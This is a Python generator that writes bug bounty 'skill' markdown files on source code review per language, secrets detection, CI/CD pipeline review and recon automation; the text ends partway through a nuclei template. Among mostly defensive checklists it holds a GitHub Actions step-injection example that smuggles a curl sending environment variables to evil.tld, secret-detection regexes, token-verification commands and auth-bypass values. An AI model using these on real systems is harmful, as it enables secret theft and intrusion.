#!/usr/bin/env python3
"""Generate SCR + AUTOMATION + SCRIPTING + PAYLOADS + EXPLOIT_DEV + REPORTING + PLATFORM + MINDSET."""
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent / "SKILL_FILES"

def w(subdir, fname, content):
    d = ROOT / subdir
    d.mkdir(parents=True, exist_ok=True)
    (d / fname).write_text(content)
    print(f"  {subdir}/{fname} ({len(content)})")

# ═══════════════════════════════════════
# SOURCE CODE REVIEW (16 files)
# ═══════════════════════════════════════
print("=== SCR ===")

w("SOURCE_CODE_REVIEW", "scr_methodology_general.md", r"""# SKILL: Source Code Review — General Methodology
## Version: 1.0 | Domain: scr

---

## IDENTITY
SCR finds the bugs scanners miss. I read code language-by-language, framework-by-framework, looking for trust boundaries, dangerous sinks, and missing controls.

## METHODOLOGY
1. **Map architecture** — entry points (HTTP routes, CLI, queue consumers), trust boundaries, data flow.
2. **Identify trust sources** — request body, query, headers, files, env vars, DB, external API responses.
3. **Trace to sinks** — DB queries, command exec, file ops, deserialization, eval, template render, HTTP fetch.
4. **Check controls** — auth middleware, input validation, output encoding, rate limit, CSRF token.
5. **Flag anti-patterns** — eval, exec, raw SQL, unbounded recursion, unbounded loops, debug code.

## TOOLS
- semgrep — pattern-based static analysis
- CodeQL — query-based deep analysis
- bandit (Python), brakeman (Rails), gosec (Go), eslint-plugin-security (JS), spotbugs+findsecbugs (Java)
- gitleaks, trufflehog (secrets)
- snyk, dependabot (dependencies)

## SEMGREP RULESETS
```bash
# Auto rules (covers most languages)
semgrep --config=auto src/

# Specific
semgrep --config=p/security-audit src/
semgrep --config=p/owasp-top-ten src/
semgrep --config=p/secrets src/
semgrep --config=p/r2c-ci src/
```

## CODEQL
```bash
codeql database create db --language=javascript --source-root=.
codeql database analyze db codeql/javascript-security-and-quality.qls --format=sarif-latest -o results.sarif
```

## CHECKLIST PER PR REVIEW
- [ ] Any new authentication / authorization paths?
- [ ] Any new SQL queries / template renders?
- [ ] Any new file uploads / downloads?
- [ ] Any new dependencies?
- [ ] Any new env-var reads (esp. with default fallback)?
- [ ] Any TODO/FIXME/HACK comments?
- [ ] Any commented-out code that hides logic?

## REFERENCES
OWASP Code Review Guide • Secure Code Review (Tanya Janca)
""")

scr_specific = {
"scr_python.md": r"""# SKILL: Python Source Code Review
## Version: 1.0 | Domain: scr

---

## DANGEROUS FUNCTIONS — flag every occurrence
```python
eval(...)                           # arbitrary code
exec(...)                           # arbitrary code
compile(...)                        # arbitrary code
os.system(...)                       # shell
subprocess.Popen(..., shell=True)    # shell injection
subprocess.call(..., shell=True)     # shell
subprocess.run(..., shell=True)      # shell
os.popen(...)                        # shell
pickle.loads(...)                    # deserialization RCE
pickle.load(...)
yaml.load(...)                       # use safe_load
yaml.unsafe_load(...)                # RCE
marshal.loads(...)                   # deserialization
__import__(user_input)                # arbitrary module
getattr(obj, user_input)             # attribute traversal
open(user_input)                     # path traversal
mark_safe(user_input)                # Django XSS
django.utils.safestring.mark_safe
jinja2.Markup(user_input)
flask.render_template_string(user_input)  # SSTI
shell=True
input()  # Python 2 only — eval-equivalent
```

## FRAMEWORK-SPECIFIC
### Django
```python
# Raw SQL
Model.objects.raw(f"SELECT * FROM x WHERE id={uid}")    # SQLi
.extra(where=[user_input])                              # SQLi
.extra(select={'x': user_input})                        # SQLi
connection.cursor().execute(f"...")                     # SQLi

# XSS
{{ user_input|safe }}     # bypasses autoescape
{% autoescape off %}{{ user_input }}{% endautoescape %}
mark_safe(user_input)

# SSRF
requests.get(user_url)     # no allowlist

# Open Redirect
HttpResponseRedirect(user_input)
return redirect(request.GET['next'])    # without validation

# Session fixation
request.session.cycle_key() missing on login

# CSRF disabled
@csrf_exempt    # check why
```

### Flask
```python
@app.route('/x')
def x():
    name = request.args.get('name')
    return f"<h1>Hello {name}</h1>"     # XSS
    return render_template_string(name)  # SSTI
    return send_file(name)               # path traversal
```

### FastAPI
```python
# Pydantic — generally safe; but dict() spread can mass-assign
@app.post('/users')
def create(user: dict):                  # no schema → mass assignment
    User(**user).save()
```

## SEMGREP COMMAND
```bash
semgrep --config=p/python --config=p/django --config=p/flask --config=p/owasp-top-ten src/
```

## REFERENCES
bandit, semgrep python ruleset, OWASP Python Security
""",

"scr_javascript_nodejs.md": r"""# SKILL: JavaScript / Node.js Source Code Review
## Version: 1.0 | Domain: scr

---

## DANGEROUS FUNCTIONS
```javascript
eval(...)                                     // code exec
Function(...)                                 // code exec
setTimeout(stringArg, ...)                    // code exec
setInterval(stringArg, ...)                   // code exec
require(userInput)                            // arbitrary module
child_process.exec(userCmd)                   // shell injection
child_process.execSync(userCmd)
child_process.spawn('sh', ['-c', userCmd])
vm.runInNewContext(userCode)                  // sandbox escape risk
fs.readFile(userPath)                         // path traversal
fs.writeFile(userPath)
res.sendFile(userPath)                        // path traversal
res.redirect(userInput)                       // open redirect
res.render('template', {...userInput})        // SSTI if userInput controls template name
mongoose.find({$where: userInput})            // NoSQL injection
db.collection.find({$where: '...'})
serialize.unserialize(input)                  // node-serialize RCE
yaml.load(input)                              // deserialization
JSON.parse(reviver=function)                   // type confusion
Object.assign({}, userInput)                  // prototype pollution
_.merge(target, userInput)                    // PP
_.set(obj, userPath, val)                     // PP
JSON.parse + setPath                           // PP
```

## EXPRESS PATTERNS
```javascript
// XSS via res.send
res.send(`<h1>${user.name}</h1>`);            // XSS
res.send(req.query.q);                         // reflected XSS

// Open redirect
res.redirect(req.query.next);

// SSRF
axios.get(req.body.url);
fetch(req.body.url);

// SQL
db.query(`SELECT * FROM u WHERE id=${id}`);    // SQLi

// CORS
app.use(cors({origin: '*', credentials: true})); // dangerous combo

// Auth missing
app.delete('/api/users/:id', (req, res) => {...});  // no auth middleware

// Mass assignment
User.update(req.body);                          // no field allowlist

// Prototype pollution sinks
Object.assign(target, JSON.parse(req.body));
_.merge(config, req.query);
```

## FRONTEND XSS (browser JS)
```javascript
element.innerHTML = userInput;                 // XSS
element.outerHTML = userInput;
element.insertAdjacentHTML(pos, userInput);
document.write(userInput);
$(el).html(userInput);                         // jQuery
location = userInput;                           // open redirect / javascript:
location.href = userInput;
window.open(userInput);
eval(userInput);
new Function(userInput);
setTimeout(userInput);                         // string arg
```

## SEMGREP
```bash
semgrep --config=p/javascript --config=p/typescript --config=p/nodejsscan --config=p/expressjs src/
```

## REFERENCES
nodesecurity • snyk JS
""",

"scr_java_spring.md": r"""# SKILL: Java / Spring Source Code Review
## Version: 1.0 | Domain: scr

---

## DANGEROUS FUNCTIONS
```java
Runtime.getRuntime().exec(userInput)
new ProcessBuilder(userArgs).start()
ScriptEngine.eval(userInput)                   // javax.script — JS in JVM
ObjectInputStream.readObject(stream)            // deserialization RCE
JNDI lookup with user input                    // Log4Shell-style
new InitialContext().lookup(userInput)
Class.forName(userClassName).newInstance()
DocumentBuilderFactory.newInstance() without secureProcessing  // XXE
SAXParserFactory without features              // XXE
XMLInputFactory without IS_SUPPORTING_EXTERNAL_ENTITIES  // XXE
TransformerFactory without secureProcessing    // XXE/XSLT
DriverManager.getConnection(userUrl)           // JDBC URL injection
Statement.executeQuery("SELECT * FROM x WHERE id=" + id)  // SQLi
@RequestMapping with @Param @SuppressWarnings  // raw injection
```

## SPRING
```java
// SpEL injection
@Value("#{T(java.lang.Runtime).getRuntime().exec('id')}")     // if user controls SpEL

// Path traversal
Resource resource = resourceLoader.getResource("file:" + userInput);

// SSRF
RestTemplate.getForObject(userUrl, ...);
WebClient.get().uri(userUrl).retrieve();

// Mass assignment
@RequestBody User user;          // if no @JsonIgnore on sensitive fields → all attributes bound
public void update(User u) { userRepo.save(u); }   // updates everything

// Spring Cloud Function CVE pattern
spring.cloud.function.routing-expression                       // RCE if exposed

// Open redirect
return "redirect:" + userInput;

// CSRF disabled
@EnableWebSecurity → http.csrf().disable()    // check why
```

## DESERIALIZATION GADGETS
- Apache Commons-Collections (CC1–CC11)
- Spring AOP (Spring1, Spring2)
- ROME, Hibernate, MyFaces, Click, JBoss

## SEMGREP / SPOTBUGS
```bash
semgrep --config=p/java --config=p/spring --config=p/owasp-top-ten src/
spotbugs -include findsecbugs.xml -textui src/
```

## REFERENCES
findsecbugs • OWASP Java Security
""",

"scr_php.md": r"""# SKILL: PHP Source Code Review
## Version: 1.0 | Domain: scr

---

## DANGEROUS FUNCTIONS
```php
eval($x)                          // code exec
assert($x)                         // <PHP 8: code exec
preg_replace('/x/e', $repl, ...)   // <PHP 7: code exec via /e
create_function('$a', $code)        // <PHP 7.2: code exec
include $userPath                   // LFI/RFI
require $userPath
include_once $userPath
require_once $userPath
system($userCmd)                    // shell
exec($userCmd)
passthru($userCmd)
shell_exec($userCmd)
popen($userCmd, 'r')
proc_open(...)
`$userCmd`                          // backtick = shell_exec
unserialize($userInput)             // deserialization
file_get_contents($userInput)       // SSRF/LFI
fopen($userInput, ...)              // SSRF/LFI
copy($userSrc, ...)
move_uploaded_file($file, $userDest)// file write
$$varName = ...                     // variable variable injection
extract($_REQUEST)                   // var pollution → register_globals-like
parse_str($userStr, $arr)
```

## FRAMEWORK
### Laravel
```php
DB::raw("...$user...")              // SQLi
DB::statement("DROP TABLE $table")  // SQLi
@php $x = $user @endphp             // SSTI in Blade if extended
{!! $user !!}                       // raw output → XSS
Mail::raw($user, ...)
File::get($user)                    // path traversal
```

### Symfony / Twig
```twig
{{ user_input|raw }}                {# XSS #}
{{ user_input|e('html') }}          {# safe #}
```

## TYPE JUGGLING (auth bypass)
```php
"0" == false   // true
"abc" == 0     // true (PHP < 8)
"0e1234" == "0e5678"   // true (both treated as 0)
md5("240610708") == md5("QNKCDZO")   // 0e... collision
strcmp(array(), "x")   // returns NULL == 0 → bypass
in_array("1", [1,2,3], false)   // true (loose)
```

## REFERENCES
RIPS docs • PHP security
""",

"scr_ruby_rails.md": r"""# SKILL: Ruby / Rails Source Code Review
## Version: 1.0 | Domain: scr

---

## DANGEROUS METHODS
```ruby
eval(input)
instance_eval(input)
class_eval(input)
Kernel.eval(input)
Marshal.load(input)         # deserialization RCE
YAML.load(input)            # use safe_load
ERB.new(input).result       # SSTI
send(method, ...)           # RCE if method controlled
public_send(method, ...)
constantize(input)          # arbitrary class
String#%(format)             # format string when format is user-controlled
File.open(input)             # LFI
File.read(input)
Open3.popen3(input)
%x[#{input}]                  # shell
\`#{input}\`
system(input)
Kernel.system
exec(input)
```

## RAILS PATTERNS
```ruby
# Raw SQL
User.where("name = '#{name}'")              # SQLi
User.where("name = ?", name)                # safe (parameterized)
User.find_by_sql("SELECT * FROM users WHERE name = '#{name}'")  # SQLi
User.exists?(["name = '#{name}'"])

# Mass assignment (if no strong params)
User.create(params[:user])                  # any attribute settable
user.update_attributes(params[:user])

# Open redirect
redirect_to params[:return_to]              # validate first

# CSRF disabled
skip_before_action :verify_authenticity_token

# Render path traversal
render file: params[:file]
render template: params[:tpl]

# XSS
raw user_input                               # bypass html_safe
<%= user_input.html_safe %>
sanitize(user_input)                         # check allow-list

# Strong parameters not used
def user_params
  params[:user]                               # missing .permit
end

# YAML.load instead of safe_load
config = YAML.load(params[:config])

# ActionController::Parameters with permit!
params[:user].permit!                        # accepts everything
```

## REFERENCES
brakeman • OWASP Rails Security
""",

"scr_go.md": r"""# SKILL: Go Source Code Review
## Version: 1.0 | Domain: scr

---

## PATTERNS TO FLAG
```go
exec.Command("sh", "-c", userInput)         // shell injection
fmt.Sprintf("SELECT * FROM x WHERE id=%s", id)  // SQLi (use prepared)
template.HTML(userInput)                      // bypass auto-escape → XSS
template.URL(userInput)                       // bypass URL escape
text/template instead of html/template        // no auto-escape (XSS in HTML output)
http.Get(userURL)                             // SSRF
http.Redirect(w, r, userInput, 302)           // open redirect
filepath.Join(base, userInput)                // can still go above base via ".."; check filepath.Clean
os.OpenFile(userPath, ...)                    // path traversal
ioutil.ReadFile(userPath)
yaml.Unmarshal — generally safe but check custom types
gob.Decode                                    // type confusion
encoding/asn1 with custom types
reflect-based deserialization
```

## SAFE BY DEFAULT
- `database/sql.DB.Query("...?...", arg)` — parameterized.
- `html/template` — auto-escapes for HTML, JS, URL contexts.
- `crypto/rand` for tokens (not `math/rand`).

## RACE
```go
// goroutine without sync
go func() { sharedMap[k] = v }()             // race
// Use sync.Mutex / sync.RWMutex / sync.Map

// time-of-check vs time-of-use
if !exists(file) { create(file) }            // TOCTOU
```

## TOOLS
```bash
gosec ./...
staticcheck ./...
nilaway ./...
semgrep --config=p/go ./...
```

## REFERENCES
gosec, OWASP Go Security
""",

"scr_rust.md": r"""# SKILL: Rust Source Code Review
## Version: 1.0 | Domain: scr

---

## PATTERNS
- `unsafe { ... }` — review every block; common UB sources.
- `std::mem::transmute` — type pun; UB if invalid.
- `Box::from_raw` / `Box::into_raw` — manual lifetime.
- `unwrap()` / `expect()` in HTTP handlers — DoS via panic.
- Integer overflow in `usize` arithmetic (silent in release; panic in debug). Use `checked_add` / `saturating_add`.
- `format!` / `println!` with user-controlled format string — use `"{}", input` not `input` as format.
- `process::Command::new("sh").arg("-c").arg(user)` — shell injection (rare in Rust idiomatic code).
- `serde_json` from untrusted source — type confusion via tagged enums.
- `cargo audit` for known dep CVEs.

## WEB FRAMEWORKS
- **Actix-Web** — `web::Json<T>` deserialization; check size limits.
- **Axum** — same.
- **Rocket** — `Form<T>` similar.
- SQLx — uses parameterized queries; raw query via `query!` is compile-time checked.
- Diesel — generally safe; raw `sql_query` is dangerous.

## TOOLS
```bash
cargo clippy -- -D warnings
cargo audit
cargo geiger    # find unsafe usage
semgrep --config=p/rust src/
```

## REFERENCES
RustSec advisory DB
""",

"scr_dotnet_csharp.md": r"""# SKILL: .NET / C# Source Code Review
## Version: 1.0 | Domain: scr

---

## DANGEROUS APIS
```csharp
Process.Start(userCmd, userArgs)            // shell
new SqlCommand($"SELECT * FROM x WHERE id={id}", conn)  // SQLi (use parameters)
db.Database.ExecuteSqlRaw($"...{user}...")   // EF raw SQL
XmlDocument.LoadXml(userXml)                 // XXE if XmlResolver not null
XmlReaderSettings { DtdProcessing = Parse }   // XXE
new BinaryFormatter().Deserialize(stream)    // .NET serialization RCE
JsonConvert.DeserializeObject(json, new JsonSerializerSettings { TypeNameHandling = All })  // RCE via $type
DataContractSerializer with KnownTypes user-controlled
SoapFormatter, NetDataContractSerializer, LosFormatter, ObjectStateFormatter   // all RCE-prone
Activator.CreateInstance(Type.GetType(userTypeName))   // arbitrary class
Assembly.Load(userBytes)                      // arbitrary code
HttpClient.GetAsync(userUrl)                  // SSRF
File.ReadAllText(userPath)                    // LFI
File.WriteAllText(userPath, ...)
@Html.Raw(userInput)                          // bypass anti-XSS
Razor: @user                                   // safe; @Html.Raw → XSS
```

## ASP.NET PATTERNS
```csharp
// Mass assignment via TryUpdateModelAsync without explicit fields
await TryUpdateModelAsync(user);              // updates everything

// Auth missing
[Route("api/admin/[action]")]
public class AdminController : ControllerBase  // no [Authorize]

// Open redirect
return Redirect(userInput);                   // use LocalRedirect
```

## TOOLS
```bash
dotnet tool install --global security-scan
security-scan src.csproj
semgrep --config=p/csharp src/
```

## REFERENCES
OWASP .NET Project • ysoserial.net gadgets
""",

"scr_cpp.md": r"""# SKILL: C/C++ Source Code Review
## Version: 1.0 | Domain: scr

---

## MEMORY-CORRUPTION SINKS
```c
strcpy, strcat, sprintf, gets             // unbounded
strncpy without explicit null-term         // off-by-one
memcpy with attacker-controlled size       // overflow
malloc(user_size) without check            // could be 0 or huge
alloca(user_size)                           // stack overflow
realloc — handle NULL return
free(p); ... use(p);                       // UAF
double-free
TOCTOU on file ops
sscanf without size limit
fopen("rb"); read N bytes into stack buffer
integer overflow in size calc: a*b+c
format string: printf(user)                // info leak / RCE
```

## TOOLS
- AddressSanitizer (`-fsanitize=address`)
- UndefinedBehaviorSanitizer (`-fsanitize=undefined`)
- LeakSanitizer
- Valgrind
- AFL++/libFuzzer for fuzzing
- Coverity / SonarQube static analysis
- semgrep --config=p/c

## REFERENCES
SEI CERT C/C++ Coding Standards • CWE Top 25
""",

"scr_smart_contracts_solidity.md": r"""# SKILL: Solidity / Smart Contract Review
## Version: 1.0 | Domain: scr (web3)

---

## VULNERABILITY CLASSES
- **Reentrancy** — external call before state update. Mitigation: checks-effects-interactions, ReentrancyGuard.
- **Integer overflow/underflow** — Solidity <0.8 silent wrap. Mitigation: SafeMath or 0.8+.
- **Access control** — missing `onlyOwner` / role check on critical functions.
- **tx.origin auth** — phishing risk; use msg.sender.
- **Unchecked low-level calls** — `(bool ok,) = addr.call(...)` without checking ok.
- **Front-running / MEV** — order-dependent operations on public mempool.
- **Block.timestamp / block.number as randomness** — miner-manipulable.
- **Delegatecall to untrusted contract** — full storage takeover.
- **Self-destruct from arbitrary caller** — drain funds.
- **Price oracle manipulation** — flash loan + Uniswap spot price.
- **Signature replay** — missing nonce or chain-id in EIP-712.
- **Initialization** — `initialize()` callable by anyone in proxy patterns.
- **Storage collision** in upgradeable proxies.
- **Phishing approval** — unlimited ERC20 approve to malicious contract.

## TOOLS
- Slither (Trail of Bits)
- Mythril
- Echidna (fuzzer)
- Manticore (symbolic execution)
- Foundry's `forge test --gas-report`

```bash
slither contracts/
myth analyze contracts/Token.sol
echidna-test contracts/Token.sol --contract Token
```

## REFERENCES
SWC Registry • Trail of Bits Building Secure Contracts • Immunefi reports
""",

"scr_dangerous_functions_all_langs.md": r"""# SKILL: Dangerous Functions Reference (All Languages)
## Version: 1.0 | Domain: scr

---

## QUICK GREP
```bash
# Eval-class
rg -n 'eval\(|exec\(|Function\(|setTimeout\([^,]*,|new\s+Function|compile\(|importlib|__import__\('

# Shell injection
rg -n 'system\(|popen\(|shell_exec|passthru|exec\.Command|Runtime\.getRuntime|child_process\.exec|subprocess\..*shell=True|backtick'

# Deserialization
rg -n 'pickle\.load|yaml\.load|Marshal\.load|unserialize\(|ObjectInputStream|BinaryFormatter|DataContractSerializer|TypeNameHandling|node-serialize|deserialize'

# Template injection
rg -n 'render_template_string|Twig.*sandbox.*disable|ERB\.new|eval.*template|jinja2.*Template'

# SSRF sinks
rg -n 'urlopen|requests\.get|axios\.get|http\.Get|HttpClient\.GetAsync|fetch\(|file_get_contents.*http|curl_exec'

# SQL injection (raw)
rg -n 'executeQuery\(.*\+|f"SELECT|format!.*SELECT|sprintf.*SELECT|query\(\`.*\\$|\\\\\$\\{.*sql|\\.raw\\(|\\.exec\\(.*\\$'

# Path traversal
rg -n 'open\(\\\\?[a-zA-Z_]+\\)|fs\\.readFile\\(\\\\?[a-zA-Z_]+|File\\.open\\(\\\\?[a-zA-Z_]+|os\\.path\\.join.*request|\\.\\./'

# Hardcoded secrets
rg -nE '(password|secret|token|api[_-]?key)\\s*[:=]\\s*["\\\\\\\']'
```

## REFERENCES
OWASP, semgrep, gosec, bandit, brakeman
""",

"scr_secrets_detection.md": r"""# SKILL: Secrets Detection in Source Code
## Version: 1.0 | Domain: scr

---

## TOOLS
- **trufflehog** — best for verified secret detection
- **gitleaks** — fast pattern matching
- **detect-secrets** (Yelp) — for pre-commit hooks
- **noseyparker** — Rust, fast historical scan
- **scoutsuite, nodejsscan** — multi-purpose

## COMMANDS
```bash
# Whole repo + history
trufflehog filesystem --json . > truffle.json
trufflehog git file://. --only-verified

# Org-wide
trufflehog github --org=examplecorp --only-verified --json > org.json

# Gitleaks
gitleaks detect --source=. --report-format=json --report-path=leaks.json

# Including dangling commits
git rev-list --objects --all | git cat-file --batch-check='%(objecttype) %(objectname) %(rest)' | awk '$1=="blob" {print $2}' > all_blobs.txt
for blob in $(cat all_blobs.txt); do
  git cat-file -p $blob | grep -E 'AKIA|ghp_|gho_|ghs_|sk_live|xoxb-' && echo "BLOB: $blob"
done
```

## CUSTOM REGEX (high-value)
```
AKIA[0-9A-Z]{16}                            # AWS access key
ghp_[a-zA-Z0-9]{36}                          # GitHub PAT
ghs_[a-zA-Z0-9]{36}                          # GitHub server token
gho_[a-zA-Z0-9]{36}                          # GitHub OAuth
xox[baprs]-[a-zA-Z0-9-]+                     # Slack
sk_live_[0-9a-zA-Z]{24,}                     # Stripe live
sk_test_[0-9a-zA-Z]{24,}                     # Stripe test
SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}     # SendGrid
AIza[0-9A-Za-z_-]{35}                         # Google API
[a-zA-Z0-9+/=]{300,}                          # large base64 → keys/certs
-----BEGIN [A-Z ]+ PRIVATE KEY-----            # any private key
```

## VERIFICATION (don't report unverified)
- AWS: `aws sts get-caller-identity`
- GitHub: `curl -H "Authorization: token X" https://api.github.com/user`
- Slack: `curl -X POST https://slack.com/api/auth.test -H "Authorization: Bearer X"`
- Stripe: `curl https://api.stripe.com/v1/balance -u X:`

## REFERENCES
trufflehog, gitleaks docs
""",

"scr_dependency_analysis.md": r"""# SKILL: Dependency Analysis
## Version: 1.0 | Domain: scr

---

## TOOLS
- **snyk** — comprehensive vuln DB + advisor
- **npm audit / yarn audit / pnpm audit**
- **pip-audit**
- **bundler-audit**
- **cargo audit**
- **govulncheck**
- **OWASP dependency-check**
- **Trivy** — multi-ecosystem
- **dependabot** (GitHub native)

## COMMANDS
```bash
# Node
npm audit --json
yarn audit --json
snyk test

# Python
pip-audit
safety check
snyk test --file=requirements.txt

# Ruby
bundler-audit check
brakeman

# Go
govulncheck ./...

# Rust
cargo audit

# Java
dependency-check.sh --scan src/
mvn dependency-check:check

# Multi-ecosystem
trivy fs --security-checks vuln src/
```

## DEPENDENCY CONFUSION
See VULNERABILITIES/WEB/dependency_confusion.md.
```bash
confused -l npm package.json
confused -l pypi requirements.txt
confused -l mvn pom.xml
```

## TYPOSQUATTING
- Check for slight misspellings of popular packages.
- `npm view PACKAGE` to see metadata before install.

## REFERENCES
Snyk vuln DB, GitHub Advisory Database, OSV.dev
""",

"scr_iac_terraform_ansible.md": r"""# SKILL: Infrastructure-as-Code Review (Terraform / Ansible / CloudFormation)
## Version: 1.0 | Domain: scr (iac)

---

## TERRAFORM
```bash
# Static analysis
tfsec .
checkov -d .
terrascan scan -i terraform
trivy config .

# Common findings
- S3 bucket with public ACL
- Security group 0.0.0.0/0 on SSH/RDP
- IAM policies with "*" actions or resources
- Unencrypted RDS / EBS / S3
- Missing CloudTrail / VPC Flow Logs
- Public RDS endpoint
- Lambda with VPC, but no encryption
```

## ANSIBLE
```bash
ansible-lint playbook.yml
- become: yes without explicit reason
- shell vs command (shell allows injection)
- no_log: false on tasks with secrets
- module: shell with j2 template containing user input
```

## CLOUDFORMATION
```bash
cfn-lint template.yaml
cfn-nag scan -i template.yaml
- Resources with PublicAccess
- IAM Policies with wildcards
- Missing encryption
```

## SEMGREP
```bash
semgrep --config=p/terraform .
semgrep --config=p/cloudformation .
```

## REFERENCES
tfsec, checkov, OPA/Conftest
""",

"scr_ci_cd_pipeline_review.md": r"""# SKILL: CI/CD Pipeline Review
## Version: 1.0 | Domain: scr

---

## ATTACK SURFACE
- **Secrets in env vars** — exposed via `env:` print or build artifacts
- **Public PR triggers** — `pull_request_target` runs with secrets even on fork PRs (GitHub Actions classic)
- **Cache poisoning** — write to actions/cache from untrusted job
- **Self-hosted runners** — non-ephemeral; persistent foothold
- **Token scope** — `${{ secrets.GITHUB_TOKEN }}` defaulting to write-all
- **Step injection** — `${{ github.event.issue.title }}` interpolated as bash
- **Workflow command injection** — `::set-output name=x::EVIL` from controlled input
- **Pinned action versions** — using `uses: actions/checkout@main` instead of SHA
- **Third-party action review** — supply chain
- **Artifact upload of source code** — sometimes contains secrets baked in

## EXAMPLES
### Step injection (GitHub Actions)
```yaml
- name: Comment
  run: echo "${{ github.event.issue.title }}"  # title="\\"; curl evil.tld/$(env|base64); echo \\""
```

### pull_request_target abuse
```yaml
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # checks out attacker code
      - run: npm test  # runs attacker's test code with secrets
```

## TOOLS
- gato (gitlab attack toolkit)
- harden-runner (Step Security)
- semgrep --config=p/github-actions
- raven (CycodeLabs) for GitHub Actions analysis

## REFERENCES
Security Lab — PoisonPill • Praetorian's CI/CD security research
""",
}

for fname, content in scr_specific.items():
    w("SOURCE_CODE_REVIEW", fname, content)

# ═══════════════════════════════════════
# AUTOMATION (12 files)
# ═══════════════════════════════════════
print("=== AUTOMATION ===")

automation_files = {
"monitoring_new_programs.md": r"""# SKILL: Monitoring New Bug Bounty Programs
## Version: 1.0 | Domain: automation

---

## SOURCES
- HackerOne hacktivity → /hacktivity
- HackerOne directory → /directory/programs
- Bugcrowd programs → /programs/list
- Intigriti → /programs
- YesWeHack → /program
- Immunefi → /explore
- HackenProof → /programs
- Bug bounty roundups (Twitter @disclosedh1, @bugbounty)

## SCRIPT — H1 new program watcher
```python
import requests, json, time, os
SEEN=set(open('seen.txt').read().split()) if os.path.exists('seen.txt') else set()
while True:
    r = requests.get('https://hackerone.com/programs/search?query=&sort_type=published_at&page=1', headers={'Accept':'application/json'})
    for p in r.json()['programs']:
        if p['handle'] not in SEEN:
            requests.post(os.environ['DISCORD_WH'], json={'content': f"NEW: {p['name']} https://hackerone.com/{p['handle']}"})
            SEEN.add(p['handle']); open('seen.txt','a').write(p['handle']+'\\n')
    time.sleep(3600)
```

## CRON
```
*/30 * * * * /home/ubuntu/scripts/watch_h1.py >> /var/log/h1watch.log 2>&1
```

## TOOLS
- chaos.projectdiscovery.io — daily program-scope dumps
- bbscope — pull program scopes from H1/BC/IGT
- bbradar (community feed)

## REFERENCES
disclosed-h1.com, hackerone.com/hacktivity
""",

"monitoring_scope_changes.md": r"""# SKILL: Monitoring Scope Changes
## Version: 1.0 | Domain: automation

---

## STRATEGY
Programs change scope. New asset = first-mover advantage. Diff scope page hourly.

## SCRIPT
```bash
#!/usr/bin/env bash
TARGET=$1
URL="https://hackerone.com/${TARGET}/policy_scopes/all_eligible/json"
DIR="$HOME/scope_watch/${TARGET}"
mkdir -p "$DIR"
curl -sk "$URL" -o "$DIR/now.json"
[ -f "$DIR/last.json" ] || cp "$DIR/now.json" "$DIR/last.json"
diff <(jq -S . "$DIR/last.json") <(jq -S . "$DIR/now.json") > "$DIR/diff.txt"
if [ -s "$DIR/diff.txt" ]; then
  cat "$DIR/diff.txt" | python3 ~/scripts/notify_discord.py "[$TARGET] scope changed"
  cp "$DIR/now.json" "$DIR/last.json"
fi
```

## CRON
```
*/15 * * * * /home/ubuntu/scripts/scope_watch.sh hackerone-target
```

## TOOLS
- bbscope (collect raw)
- chaos for project-discovery dumps

## REFERENCES
chaos.projectdiscovery.io
""",

"monitoring_new_assets.md": r"""# SKILL: Monitoring New Assets (Subdomains, IPs, Tech)
## Version: 1.0 | Domain: automation

---

## CERTSTREAM (LIVE CERT FEED)
```python
import certstream, os, requests
TARGETS = open('targets.txt').read().split()
def cb(msg, ctx):
    if msg.get('message_type') != 'certificate_update': return
    for d in msg['data']['leaf_cert']['all_domains']:
        for t in TARGETS:
            if d.endswith('.'+t) or d == t:
                requests.post(os.environ['DISCORD_WH'], json={'content': f'NEW CERT: {d}'})
certstream.listen_for_events(cb, url='wss://certstream.calidog.io')
```

## SUBDOMAIN DIFFING (CRON)
```bash
TARGET=$1
DIR=$HOME/subwatch/$TARGET
mkdir -p $DIR
subfinder -d $TARGET -all -silent | sort -u > $DIR/now.txt
[ -f $DIR/last.txt ] || cp $DIR/now.txt $DIR/last.txt
NEW=$(comm -23 $DIR/now.txt $DIR/last.txt)
[ -n "$NEW" ] && echo "$NEW" | python3 ~/scripts/notify_discord.py "[$TARGET] new subs"
cp $DIR/now.txt $DIR/last.txt
```

## ASSET FINGERPRINT WATCH
```bash
httpx -l alive.txt -tech-detect -title -ip -json > now.jsonl
diff <(jq -S . last.jsonl) <(jq -S . now.jsonl) | python3 notify.py "tech changed"
```

## REFERENCES
ProjectDiscovery chaos, certstream
""",

"recon_pipeline_automation.md": r"""# SKILL: Recon Pipeline Automation
## Version: 1.0 | Domain: automation

---

(See SKILL_FILES/RECON/16_recon_automation_pipeline.md for the full pipeline shell script. This file documents pipeline patterns specifically.)

## PATTERNS
1. **Idempotent stages** — each stage produces a deterministic output file; re-running doesn't duplicate effort.
2. **Diff-driven** — compare to last run, only process delta.
3. **Throttled** — respect program rate limits.
4. **Parallel-safe** — multiple targets concurrently without race.
5. **Fail-fast** — `set -euo pipefail` + non-zero exit on any stage failure.
6. **Observability** — log to file + push notification on critical events.
7. **Stateful** — persist `last/` symlinks between runs.

## ORCHESTRATION
- **bash + cron** — simplest, sufficient for solo hunting.
- **systemd timers** — better restart behavior than cron.
- **Apache Airflow** — DAG with retries, dependencies (overkill for solo).
- **Prefect / Dagster** — modern Python DAG orchestrators.
- **Make** — for ad-hoc one-shot pipelines.
- **axiom + tmux + cron** — distributed across cheap VPSes.

## REFERENCES
RECON/16_recon_automation_pipeline.md
""",

"nuclei_custom_templates.md": r"""# SKILL: Nuclei Custom Templates
## Version: 1.0 | Domain: automation

---

## STRUCTURE
```yaml
id: my-custom-check
info:
  name: Detect Specific Endpoint Misconfig
  author: hunter
  severity: high
  tags: misconfig,custom
http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/debug"
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "DEBUG"
          - "stack trace"
        condition: or
      - type: status
        status:
          - 200
```

## RUN
```bash
nuclei -t custom-templates/ -l targets.txt -o findings.txt -severity medium,high,critical
```

## DSL FUNCTIONS
- `to_lower`, `to_upper`, `base64`, `base64_decode`, `md5`, `sha256`, `len`, `contains`
- `dsl: ['contains(body,"foo") && status_code == 200']`

## DYNAMIC EXTRACTORS
```yaml
extractors:
  - type: regex
    regex:
      - 'token=([a-zA-Z0-9]+)'
    group: 1
```

## CHAINING (multi-step)
```yaml
http:
  - raw:
      - |
        POST /login HTTP/1.1
